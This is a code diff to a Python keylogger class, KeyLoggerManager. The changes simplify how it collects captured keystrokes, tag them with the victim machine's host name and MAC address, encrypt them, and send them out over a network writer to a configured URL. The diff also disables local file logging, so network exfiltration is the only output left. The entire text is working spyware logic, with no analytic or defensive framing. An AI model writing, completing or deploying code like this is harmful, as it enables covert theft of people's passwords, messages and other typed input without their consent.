@@ -12,7 +12,7 @@ class KeyLoggerManager:
 
     def __init__(self, url: str, interval: int = 10):
         self.__interval = interval
-        self.__buffer = Buffer()
+        # self.__buffer = Buffer()
         self.__machine_name = {socket.gethostname(): str(get_mac_address())}
         self.__service = KeyLoggerService()
         self.__filewriter = FileWriter()
@@ -30,26 +30,20 @@ class KeyLoggerManager:
             if len(self.__service.get_logged_keys()) == 0:
                 continue
             else:
-                self.__buffer.add_data("".join(self.__service.get_logged_keys()))
-                self.send_data(self.process_data())
-                self.__buffer.flush()
+                self.send_data(self.process_data("".join(self.__service.get_logged_keys())))
                 self.__service.flush()
 
-            print(self.__buffer.get_data())
 
 
-    def process_data(self):
-        data = self.__buffer.get_data()
+    def process_data(self, data: List[str]) -> str:
         data_str = " ".join(data)
-        #print(f"Data before encryption: {data_str}")
         encrypted_data1 = Encryptor().encrypt(data_str)
-        #print(f"Data after encryption: {encrypted_data1}")
         return encrypted_data1
 
 
     def send_data(self, enc_data: str) -> None:
         machine_name = self.__machine_name
-        self.__filewriter.send_data(enc_data, machine_name)
+        # self.__filewriter.send_data(enc_data, machine_name)
         self.__networkwriter.send_data(enc_data, machine_name)
 
 
